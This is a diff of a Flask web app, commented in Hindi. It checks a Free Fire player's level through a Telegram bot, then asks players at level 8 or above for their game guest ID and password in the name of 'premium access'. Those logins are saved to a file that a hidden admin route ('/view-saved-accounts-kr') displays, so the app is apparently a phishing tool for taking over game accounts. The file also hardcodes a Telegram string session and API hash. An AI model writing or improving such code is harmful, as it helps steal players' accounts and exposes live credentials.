@@ -1,20 +1,18 @@
 from flask import Flask, request, render_template_string, jsonify
 import asyncio
 import re
-from pyrogram import Client, filters
+from pyrogram import Client
 
 app = Flask(__name__)
 
 # ==================== TELEGRAM CONFIG ====================
 API_ID = 36111584
 API_HASH = '6f0e6729043de10d48250cc2bc613a6f'
-# आपका निकाला हुआ असली String Session
 STRING_SESSION = "BQInBOAAOgLtSj7-SKUGoo8aRfWEKh6FhHxMUgQonz6Ub6rQlPY1gul0xKn1uW8O1lw6dcs5sD1ASz0-uvFw_SgTzeNU4Qkedeyewv09fn0As4Gk5q2BWF9sKqoJFK-qB1_QZ5qmn-BOKtXo-j2P-TtiX4h4UjkcU7otYsm7reqzUmpcpasMWOzegDVEikyyobuPRLqCHQe0erFCs354ojUXz7JpZOcPUmUViScbjw3kj0qSbrTQRPv7WjYNll1KLWkmqkoTIkX8lqbUfPey1pkiDJjQiDWo3itR2Pb5uEg5LvmUvbGQfkANwv7w0DEqasddjKulYFoduLiHhoT6M8Sl0iXwOwAAAAGHwtM4AA"
 
-# उस इंफो बोट का यूजरनेम (अगर बोट का यूजरनेम कुछ और है, तो यहाँ बदल सकते हैं)
-INFO_BOT_USERNAME = "FFPlayerInfoBot" 
+# यहाँ अपने इंफो बोट का सही यूजरनेम बिना @ के लिखें
+INFO_BOT_USERNAME = "FreeFireInfoBot" 
 
-# वह फाइल जहां यूजर की गेस्ट आईडी और पासवर्ड सेव होगा
 DATA_FILE = "/tmp/saved_accounts.txt"
 
 # ==================== HTML INTERFACE ====================
@@ -86,7 +84,7 @@ HTML_TEMPLATE = """
     <script>
         let verifiedUid = "";
 
-        // स्टेप 1: यूआईडी वेरिफिकेशन
+        // स्टेप 1: यूआईडी वेरिफिकेशन हैंडलर
         document.getElementById('verifyForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const uid = document.getElementById('gameUid').value;
@@ -94,18 +92,19 @@ HTML_TEMPLATE = """
             
             resBox.style.display = 'block';
             resBox.className = 'response-box success';
-            resBox.innerText = '🔄 आपका टेलीग्राम अकाउंट इंफो बोट को /get कमांड भेज रहा है... कृपया 5-8 सेकंड रुकें...';
+            resBox.innerText = '🔄 आपका टेलीग्राम अकाउंट इंफो बोट को /get कमांड भेज रहा है... कृपया रुकें...';
 
             try {
-                const response = await fetch(`/api/tg-verify?uid=${uid}`);
+                const response = await fetch('/api/tg-verify?uid=' + uid);
                 const data = await response.json();
                 
                 if (data.success) {
                     resBox.className = 'response-box success';
+                    // 🎯 यहाँ बैकट्रिक्स (\`) का इस्तेमाल करके स्ट्रिंग को सही किया ताकि डेटा स्क्रीन पर दिखे
                     resBox.innerText = `✅ बोट रेस्पॉन्स प्राप्त हुआ!\\n\\n📝 बोट का मैसेज:\\n\${data.bot_msg}`;
                     
-                    // अगर बोट के मैसेज में लेवल मिल गया और वह 8 या उससे ऊपर है
                     if (data.level >= 8) {
+                        resBox.innerText += `\\n\\n🎉 स्तर (Level): \${data.level} (8 या उससे ऊपर है)। स्टेप 2 अनलॉक हो गया है भाई!`;
                         document.getElementById('guestId').removeAttribute('disabled');
                         document.getElementById('guestPass').removeAttribute('disabled');
                         
@@ -118,7 +117,7 @@ HTML_TEMPLATE = """
                         verifiedUid = uid;
                     } else {
                         resBox.className = 'response-box error';
-                        resBox.innerText += `\\n\\n❌ लेवल 8 से कम होने के कारण स्टेप 2 लॉक रहेगा भाई।`;
+                        resBox.innerText += `\\n\\n❌ लॉगिन फेल! बोट के अनुसार आपका स्तर \${data.level} है। प्रीमियम एक्सेस के लिए कम से कम लेवल 8 होना ज़रूरी है भाई।`;
                     }
                 } else {
                     resBox.className = 'response-box error';
@@ -170,45 +169,54 @@ HTML_TEMPLATE = """
 </html>
 """
 
-# ==================== PYROGRAM LOGIC ============
+# ==================== PYROGRAM BACKGROUND LOGIC ============
 async def ask_info_bot(uid):
-    # स्ट्रिंग सेशन की मदद से एडमिन का टेलीग्राम अकाउंट चालू करना
     tg_client = Client("kr_web_client", api_id=API_ID, api_hash=API_HASH, session_string=STRING_SESSION, in_memory=True)
     try:
         await tg_client.start()
         
+        # पुराना चैट इतिहास साफ या मार्क रीड करना ताकि पुराना मैसेज मिक्स न हो
+        try:
+            await tg_client.read_chat_history(INFO_BOT_USERNAME)
+        except:
+            pass
+
         # इंफो बोट को कमांड भेजना
-        sent_msg = await tg_client.send_message(INFO_BOT_USERNAME, f"/get {uid}")
+        await tg_client.send_message(INFO_BOT_USERNAME, f"/get {uid}")
         
-        # बोट के रिप्लाई का इंतजार करना (अधिकतम 8 सेकंड)
-        await asyncio.sleep(6)
+        # बोट के रिप्लाई का इंतजार (7 सेकंड रुकना ताकि बोट फोटो/टेक्स्ट भेज सके)
+        await asyncio.sleep(7)
         
         bot_response_text = ""
-        # आखिरी के 3 मैसेजेस चेक करना कि बोट ने क्या भेजा
+        
+        # बोट चैट से एकदम लेटेस्ट मैसेजेस निकालना
         async for message in tg_client.get_chat_history(INFO_BOT_USERNAME, limit=3):
-            if message.id == sent_msg.id:
-                continue
-            # चाहे बोट फोटो के नीचे टेक्स्ट भेजे (caption) या नॉर्मल टेक्स्ट मैसेज भेजे, दोनों को कैप्चर करना
-            if message.caption:
-                bot_response_text = message.caption
-                break
-            elif message.text:
-                bot_response_text = message.text
-                break
+            # बोट का रिप्लाई या तो कैप्शन (अगर फोटो भेजी है) या नॉर्मल टेक्स्ट होगा
+            if message.from_user and message.from_user.username == INFO_BOT_USERNAME:
+                if message.caption:
+                    bot_response_text = message.caption
+                    break
+                elif message.text:
+                    bot_response_text = message.text
+                    break
                 
         await tg_client.stop()
         
         if bot_response_text:
-            # रेगुलर एक्सप्रेशन की मदद से टेक्स्ट में से 'Level' या 'स्तर' के आगे के नंबर को ढूंढना
-            level_match = re.search(r'(?:Level|level|स्तर)\s*:\s*(\d+)', bot_response_text)
-            # अगर सीधा न मिले तो पूरे मैसेज में जहाँ भी कोई 2 अंकों का नंबर हो उसे देखना
-            level = int(level_match.group(1)) if level_match else 0
-            if level == 0:
-                # बैकअप चेक: टेक्स्ट में से पहला नंबर ढूंढना जो लेवल हो सकता है
-                nums = re.findall(r'\b\d+\b', bot_response_text)
-                for n in nums:
-                    if 1 <= int(n) <= 100:  # गेम का लेवल 1 से 100 के बीच ही होगा
-                        level = int(n)
+            # बोट के रिप्लाई में से लेवल (Level) नंबर ढूंढना
+            # यह 'Level : 55' या 'स्तर : 60' या 'Lv: 8' जैसे किसी भी फॉर्मेट से नंबर निकाल लेगा
+            level_match = re.search(r'(?:Level|level|स्तर|Lv|LV)\s*[:\s]*\s*(\d+)', bot_response_text)
+            
+            if level_match:
+                level = int(level_match.group(1))
+            else:
+                # अगर सीधे नहीं मिला, तो पूरे मैसेज में से 1 से 100 के बीच का कोई भी वैलिड नंबर ढूंढना
+                all_nums = re.findall(r'\b\d+\b', bot_response_text)
+                level = 0
+                for n in all_nums:
+                    val = int(n)
+                    if 1 <= val <= 100:  # गेम का लेवल आमतौर पर 1 से 100 होता है
+                        level = val
                         break
                         
             return {"success": True, "bot_msg": bot_response_text, "level": level}
@@ -231,10 +239,11 @@ def tg_verify():
     if not uid:
         return jsonify({"success": False, "message": "UID आवश्यक है"}), 400
         
-    # एसिंक्रोनस (Async) टेलीग्राम फंक्शन को सिंक्रोनस फ्लैस्क में रन करने का तरीका
+    # एसिंक फंक्शन को बिना एरर के रन करने के लिए नया लूप
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     result = loop.run_until_complete(ask_info_bot(uid))
+    loop.close()
     return jsonify(result)
 
 @app.route('/api/save-guest', methods=['POST'])
@@ -252,7 +261,6 @@ def save_guest():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
 
-# गुप्त रूट - डेटा देखने के लिए
 @app.route('/view-saved-accounts-kr')
 def view_accounts():
     import os
